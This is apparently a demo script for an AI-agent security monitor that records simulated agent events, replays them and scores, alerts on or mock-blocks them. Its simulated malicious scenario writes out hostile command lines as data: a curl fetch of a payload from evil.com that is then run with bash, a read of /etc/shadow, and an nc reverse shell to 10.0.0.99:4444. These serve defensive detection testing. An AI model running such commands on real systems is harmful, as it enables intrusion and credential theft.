#!/usr/bin/env python3
"""
record_and_replay.py — 录制-回放工作流端到端演示

完整流程:
  Phase 1 [录制]  模拟 AGENT 运行，实时录制事件到 JSONL 文件
  Phase 2 [回放]  通过 FileReplayCollector 加载录制文件
  Phase 3 [分析]  经过 observer_core 全链路处理，输出报告和模拟阻断

用法:
    # 使用内置模拟数据演示
    python record_and_replay.py

    # 指定自定义录制文件路径
    python record_and_replay.py --output output/recorded/my_session.jsonl

    # 使用自定义录制文件进行回放分析
    python record_and_replay.py --replay-only output/recorded/my_session.jsonl

    # 指定场景类型 (malicious / normal / custom)
    python record_and_replay.py --scenario malicious
    python record_and_replay.py --scenario normal
"""

import sys
import os
import argparse
import json
import time
import logging
from datetime import datetime
from typing import List

# 添加项目路径
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from models.event import RawEvent
from models.virtual_clock import VirtualClock
from models.risk import DecisionAction
from observer_core.monitoring.event_normalizer import EventNormalizer
from observer_core.monitoring.rule_engine import RuleEngine
from observer_core.judgment.risk_scorer import RiskScorer
from observer_core.judgment.baseline_checker import BaselineChecker
from observer_core.judgment.decision_engine import DecisionEngine
from observer_core.judgment.chain_report_builder import ChainReportBuilder
from observer_core.blocking.blocking_coordinator import BlockingCoordinator
from observer_core.blocking.command_sender import MockCommandSender
from observer_core.audit.behavior_graph import BehaviorGraph
from observer_core.audit.audit_logger import AuditLogger
from observer_core.audit.report_exporter import ReportExporter
from collector.event_recorder import EventRecorder
from collector.file_replay_collector import FileReplayCollector

logger = logging.getLogger("record_and_replay")


# ============================================================
# 内置模拟事件数据（模拟 AGENT 运行产生的事件）
# ============================================================

def _generate_malicious_agent_events(agent_id: str = "target-agent") -> List[RawEvent]:
    """
    模拟恶意 AGENT 运行产生的事件序列:
    curl 下载 → 网络连接 → 写入文件 → 执行脚本 → 读取敏感文件 → 外传数据
    """
    base_ts = 1718092800000000000  # 2024-06-11 08:00:00 UTC
    events = [
        RawEvent(
            event_id="rec_001", timestamp_ns=base_ts,
            event_type="exec", pid=50001, ppid=50000,
            agent_id=agent_id, agent_framework="recorded",
            executable="/usr/bin/curl",
            arguments=["curl", "-s", "https://evil.com/payload.sh"],
        ),
        RawEvent(
            event_id="rec_002", timestamp_ns=base_ts + 100_000_000,
            event_type="net_conn", pid=50001, ppid=50000,
            agent_id=agent_id, agent_framework="recorded",
            remote_addr="192.168.1.100", remote_port=443, protocol="TCP",
        ),
        RawEvent(
            event_id="rec_003", timestamp_ns=base_ts + 200_000_000,
            event_type="file_open", pid=50001, ppid=50000,
            agent_id=agent_id, agent_framework="recorded",
            file_path="/tmp/payload.sh", file_op="write",
        ),
        RawEvent(
            event_id="rec_004", timestamp_ns=base_ts + 300_000_000,
            event_type="exec", pid=50002, ppid=50000,
            agent_id=agent_id, agent_framework="recorded",
            executable="/bin/bash",
            arguments=["bash", "/tmp/payload.sh"],
        ),
        RawEvent(
            event_id="rec_005", timestamp_ns=base_ts + 400_000_000,
            event_type="file_open", pid=50002, ppid=50000,
            agent_id=agent_id, agent_framework="recorded",
            file_path="/etc/shadow", file_op="read",
        ),
        RawEvent(
            event_id="rec_006", timestamp_ns=base_ts + 500_000_000,
            event_type="net_conn", pid=50002, ppid=50000,
            agent_id=agent_id, agent_framework="recorded",
            remote_addr="10.0.0.99", remote_port=4444, protocol="TCP",
        ),
        RawEvent(
            event_id="rec_007", timestamp_ns=base_ts + 600_000_000,
            event_type="exec", pid=50003, ppid=50000,
            agent_id=agent_id, agent_framework="recorded",
            executable="/usr/bin/nc",
            arguments=["nc", "-e", "/bin/sh", "10.0.0.99", "4444"],
        ),
    ]
    return events


def _generate_normal_agent_events(agent_id: str = "dev-agent") -> List[RawEvent]:
    """
    模拟正常开发者 AGENT 运行产生的事件序列:
    编译 → 读源码 → git commit → 网络连接(github)
    """
    base_ts = 1718092800000000000
    events = [
        RawEvent(
            event_id="rec_001", timestamp_ns=base_ts,
            event_type="exec", pid=60001, ppid=60000,
            agent_id=agent_id, agent_framework="recorded",
            executable="/usr/bin/gcc",
            arguments=["gcc", "-o", "main", "main.c"],
        ),
        RawEvent(
            event_id="rec_002", timestamp_ns=base_ts + 100_000_000,
            event_type="file_open", pid=60001, ppid=60000,
            agent_id=agent_id, agent_framework="recorded",
            file_path="/home/dev/project/main.c", file_op="read",
        ),
        RawEvent(
            event_id="rec_003", timestamp_ns=base_ts + 300_000_000,
            event_type="exec", pid=60002, ppid=60000,
            agent_id=agent_id, agent_framework="recorded",
            executable="/usr/bin/git",
            arguments=["git", "commit", "-m", "fix bug #123"],
        ),
        RawEvent(
            event_id="rec_004", timestamp_ns=base_ts + 400_000_000,
            event_type="net_conn", pid=60002, ppid=60000,
            agent_id=agent_id, agent_framework="recorded",
            remote_addr="140.82.121.4", remote_port=443, protocol="TCP",
        ),
    ]
    return events


# ============================================================
# Phase 1: 录制
# ============================================================

def phase_record(events: List[RawEvent], output_path: str,
                 agent_id: str) -> str:
    """
    Phase 1: 录制 AGENT 事件到 JSONL 文件。

    模拟 AGENT 运行时产生的事件流，通过 EventRecorder 实时录制。

    参数:
        events:      模拟的事件列表（实际场景中来自真实 AGENT 探针）
        output_path: 录制文件输出路径
        agent_id:    Agent 标识

    返回:
        str: 录制文件路径
    """
    print(f"\n{'='*60}")
    print(f"  Phase 1: RECORD -- Recording AGENT events")
    print(f"{'='*60}")
    print(f"  Output:    {output_path}")
    print(f"  Agent ID:  {agent_id}")
    print(f"  Events:    {len(events)}")
    print()

    recorder = EventRecorder(
        output_path=output_path,
        agent_id=agent_id,
        header_comments=[
            f"Scenario: recorded session",
            f"Agent: {agent_id}",
        ],
    )
    recorder.start()

    # 模拟实时事件流（逐条录制）
    for i, event in enumerate(events, 1):
        recorder.write(event)
        et = event.event_type
        desc = ""
        if et == "exec":
            desc = f"{event.executable} {' '.join(event.arguments or [])}"
        elif et == "file_open":
            desc = f"{event.file_op} {event.file_path}"
        elif et == "net_conn":
            desc = f"{event.remote_addr}:{event.remote_port}"
        print(f"  [REC {i:03d}] {et:10s} | {desc}")

    count = recorder.stop()

    file_size = recorder.get_recorded_file_size()
    print(f"\n  Recording complete: {count} events, {file_size} bytes")
    print(f"  File: {output_path}")

    return output_path


# ============================================================
# Phase 2 & 3: 回放 + 分析
# ============================================================

def phase_replay_and_analyze(recorded_path: str, output_base: str,
                             config: dict) -> dict:
    """
    Phase 2+3: 通过 FileReplayCollector 回放录制文件，
    经过 observer_core 全链路处理，输出分析报告。

    参数:
        recorded_path: 录制的 JSONL 文件路径
        output_base:   输出根目录
        config:        配置字典

    返回:
        dict: 运行摘要
    """
    print(f"\n{'='*60}")
    print(f"  Phase 2: REPLAY -- Loading recorded file")
    print(f"{'='*60}")
    print(f"  Input:  {recorded_path}")

    # Phase 2: 通过 FileReplayCollector 加载
    collector = FileReplayCollector(config)
    event_count = collector.load_data_file(recorded_path)
    collector.attach(agent_id="replay-agent")

    print(f"  Events loaded: {event_count}")
    print(f"  Collector: {collector.capabilities().name}")

    # Phase 3: 全链路分析
    print(f"\n{'='*60}")
    print(f"  Phase 3: ANALYZE -- Running observer_core pipeline")
    print(f"{'='*60}")

    # 初始化 observer_core 组件（复用 main.py 的 pipeline 逻辑）
    clock = VirtualClock(
        start_ns=config.get("virtual_clock", {}).get("start_ns", 1718092800000000000))
    normalizer = EventNormalizer(clock)
    rule_engine = RuleEngine()
    rules_path = os.path.join(os.path.dirname(__file__), "rules", "default_policy.yaml")
    if os.path.isfile(rules_path):
        rule_engine.load_rules(rules_path)
    scorer = RiskScorer()
    scorer.register_default_dimensions()
    baseline_checker = BaselineChecker()
    decision_engine = DecisionEngine()
    sender = MockCommandSender()

    # 输出目录
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    run_dir = os.path.join(output_base, f"replay_{ts}")
    audit_dir = os.path.join(run_dir, "audit")
    report_dir = os.path.join(run_dir, "reports")
    graph_dir = os.path.join(run_dir, "graphs")
    evidence_dir = os.path.join(run_dir, "evidence")
    for d in [audit_dir, report_dir, graph_dir, evidence_dir]:
        os.makedirs(d, exist_ok=True)

    blocking_coord = BlockingCoordinator(clock, sender, output_dir=evidence_dir)
    behavior_graph = BehaviorGraph()
    audit_logger = AuditLogger(output_dir=run_dir)
    audit_logger.set_output_dir(audit_dir)
    audit_logger.start_scenario("recorded_session")
    report_exporter = ReportExporter(output_dir=run_dir)
    report_exporter.set_output_dir(report_dir)

    stats = {"total": 0, "allow": 0, "alert": 0, "block": 0}

    # 逐事件处理
    for raw in collector.start():
        stats["total"] += 1

        # 推进时钟（回放模式下使用时间戳间隔）
        clock.advance(100)  # 每个事件间隔 100ms

        # 1. 事件归一化
        norm = normalizer.normalize(raw)

        # 2. 规则匹配
        match_result = rule_engine.match(norm)
        matched_rule_ids = [r.rule_id for r in match_result.matched_rules]

        # 3. 基线收集
        baseline_checker.collect(norm)

        # 4. 风险评分
        baseline_data = baseline_checker.get_baseline_dict()
        scorer.set_baseline(baseline_data)
        agent_ctx = normalizer.get_agent_context(raw.agent_id)
        assessment = scorer.assess(norm, match_result, agent_ctx)

        # 5. 研判决策
        decision = decision_engine.decide(assessment, norm.event_id, raw.agent_id)

        # 6. 阻断执行
        blocking_result = blocking_coord.execute(norm, decision)

        # 7. 行为图谱
        behavior_graph.add_event(
            norm, assessment=assessment, decision=decision,
            blocking_result=blocking_result, matched_rules=matched_rule_ids
        )

        # 8. 审计日志
        desc = _build_description(norm)
        audit_logger.log_event(
            norm, assessment=assessment, decision=decision,
            blocking_result=blocking_result, matched_rules=matched_rule_ids,
            description=desc
        )

        # 统计
        if blocking_result.blocked:
            stats["block"] += 1
        elif decision.action == DecisionAction.ALERT:
            stats["alert"] += 1
        else:
            stats["allow"] += 1

        status = "BLOCK" if blocking_result.blocked else (
            "ALERT" if decision.action == DecisionAction.ALERT else "PASS")
        print(f"  [{status:5s}] ({stats['total']:03d}) {desc}")

    collector.detach()
    audit_logger.close()

    # 导出报告
    print(f"\n  Generating reports...")
    report_path = report_exporter.export_scenario_report(
        scenario_id="recorded_session",
        scenario_name="Recorded AGENT Session Replay",
        audit_logger=audit_logger,
        behavior_graph=behavior_graph,
        scenario_description=f"Replay of recorded session: {recorded_path}",
        expected_result="Analyze recorded AGENT behavior",
    )

    # 保存行为图谱
    graph_path = os.path.join(graph_dir, "graph_recorded_session.json")
    behavior_graph.save_json(graph_path)

    print(f"\n  Analysis complete:")
    print(f"    Total:  {stats['total']}")
    print(f"    Allow:  {stats['allow']}")
    print(f"    Alert:  {stats['alert']}")
    print(f"    Block:  {stats['block']}")
    print(f"    Report: {report_path}")
    print(f"    Graph:  {graph_path}")
    print(f"    Audit:  {audit_dir}")
    print(f"    Output: {run_dir}")

    return {
        **stats,
        "report_path": report_path,
        "graph_path": graph_path,
        "output_dir": run_dir,
        "recorded_file": recorded_path,
    }


def _build_description(event) -> str:
    """构建事件描述"""
    et = event.event_type
    if et == "exec":
        cmd = event.command_string or ""
        if not cmd:
            parts = [event.raw.executable or ""]
            if event.raw.arguments:
                parts.extend(event.raw.arguments)
            cmd = " ".join(parts)
        return f"exec: {cmd[:60]}"
    elif et == "file_open":
        op = event.raw.file_op or "open"
        path = event.raw.file_path or ""
        return f"file_{op}: {path}"
    elif et == "net_conn":
        addr = event.raw.remote_addr or ""
        port = event.raw.remote_port
        return f"net: {addr}:{port}" if port else f"net: {addr}"
    return f"{et}"


# ============================================================
# 主入口
# ============================================================

def main():
    parser = argparse.ArgumentParser(
        description="录制-回放工作流演示 (Record-and-Replay)")
    parser.add_argument("--output", type=str,
                        default="output/recorded/session.jsonl",
                        help="录制文件输出路径")
    parser.add_argument("--replay-only", type=str, default=None,
                        help="仅回放模式：指定已有的 JSONL 文件")
    parser.add_argument("--scenario", type=str, default="malicious",
                        choices=["malicious", "normal"],
                        help="内置场景类型（默认: malicious）")
    parser.add_argument("--agent-id", type=str, default="target-agent",
                        help="Agent 标识")
    parser.add_argument("--output-base", type=str, default="output",
                        help="分析报告输出根目录")
    parser.add_argument("--config", type=str, default="config.yaml",
                        help="配置文件路径")
    args = parser.parse_args()

    # 切换到脚本所在目录
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    # 配置日志
    logging.basicConfig(
        level=logging.INFO,
        format="[%(asctime)s] %(levelname)s %(name)s: %(message)s"
    )

    # 加载配置
    with open(args.config, "r", encoding="utf-8") as f:
        config = __import__("yaml").safe_load(f)

    print(f"\n{'#'*60}")
    print(f"#  Record-and-Replay Workflow")
    print(f"#  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'#'*60}")

    if args.replay_only:
        # 仅回放模式
        recorded_path = args.replay_only
        if not os.path.isfile(recorded_path):
            print(f"\n  ERROR: File not found: {recorded_path}")
            sys.exit(1)
        phase_replay_and_analyze(recorded_path, args.output_base, config)
    else:
        # 完整录制+回放模式
        # 生成模拟事件
        if args.scenario == "malicious":
            events = _generate_malicious_agent_events(args.agent_id)
        else:
            events = _generate_normal_agent_events(args.agent_id)

        # Phase 1: 录制
        recorded_path = phase_record(
            events, args.output, args.agent_id)

        # Phase 2+3: 回放 + 分析
        phase_replay_and_analyze(recorded_path, args.output_base, config)

    print(f"\n{'#'*60}")
    print(f"#  Complete!")
    print(f"{'#'*60}\n")


if __name__ == "__main__":
    main()
